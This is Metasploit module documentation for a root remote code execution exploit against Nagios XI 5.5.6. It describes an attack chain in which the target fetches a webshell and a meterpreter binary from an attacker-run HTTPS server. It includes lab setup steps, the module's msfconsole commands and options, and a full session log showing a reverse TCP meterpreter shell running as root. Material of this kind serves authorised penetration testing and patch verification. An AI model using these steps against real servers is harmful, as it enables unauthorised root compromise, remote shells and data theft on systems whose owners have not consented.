# Vulnerable Application

Nagios XI 5.5.6 Root Remote Code Execution

The exploit works as follows:
- A local HTTPS server is setup. When it is reached, this server responds with a payload.
- By crafting a malicious request, we make the target host send a request to our HTTPS server. Therefore, the local HTTPS server must be reachable from outside your private network (except if the Nagios server is in the same network as yours obviously), this is what the RSRVHOST and RSRVPORT options are for. The malicious request allows for file upload. A PHP webshell and a meterpreter executable are uploaded.
- A command is executed thanks to the webshell. This command elevates privileges and run the meterpreter executable, giving us a meterpreter session.

# Creating A Testing Environment

- Install a Ubuntu Linux LTS (I used 18.04 LTS for my tests) in a VM.
- Download Nagios XI 5.5.6 from the official website (https://www.nagios.com/downloads/nagios-xi/older-releases/).
- Follow the official instructions to install it on your Ubuntu VM (https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf).

# Verification Steps

`use exploit/linux/http/nagios_xi_root_rce`
`set RHOSTS [IP]`
`set RSRVHOST [IP]`
`exploit`
A meterpreter session should have been opened successfully and you should be root

# Options

## RSRVHOST

IP at which your local HTTPS can be reached. Most of the time it will be a public IP (e.g. your router IP if you have port forwarding).

## RSRVPORT

Port that will forward to your local HTTPS server.

## SRVHOST

IP of your local HTTPS server (must be a local IP).

## SRVPORT

Port to listen to for your local HTTPS server.

# Scenarios

## Nagios 5.5.6 on Ubuntu 18.04 LTS

```
msf5 > use exploit/linux/http/nagios_xi_root_rce
msf5 exploit(linux/http/nagios_xi_root_rce) > set RHOSTS 192.168.0.57
RHOSTS => 192.168.0.57
msf5 exploit(linux/http/nagios_xi_root_rce) > set RSRVHOST 192.168.0.50
RSRVHOST => 192.168.0.50
msf5 exploit(linux/http/nagios_xi_root_rce) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.0.50:4444
[*] Using URL: https://0.0.0.0:8080/yXgRPrO9L8zIt
[*] Local IP: https://192.168.0.50:8080/yXgRPrO9L8zIt
[*] Server started.
[*] webshell.php uploaded with success!
[*] Using URL: https://0.0.0.0:8080/oDRVURAY82YcT
[*] Local IP: https://192.168.0.50:8080/oDRVURAY82YcT
[*] Server started.
[*] meterpreter uploaded with success!
[*] Sending stage (985320 bytes) to 192.168.0.57
[*] Meterpreter session 1 opened (192.168.0.50:4444 -> 192.168.0.57:33162) at 2019-06-16 23:44:34 +0100
[+] Deleted /usr/local/nagvis/share/webshell.php
[+] Deleted /usr/local/nagvis/share/meterpreter
[!] This exploit may require manual cleanup of '/var/tmp/shell.nse' on the target
[*] Server stopped.

msf5 exploit(linux/http/nagios_xi_root_rce) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > sysinfo
Computer     : 192.168.0.57
OS           : Ubuntu 18.04 (Linux 4.18.0-21-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```
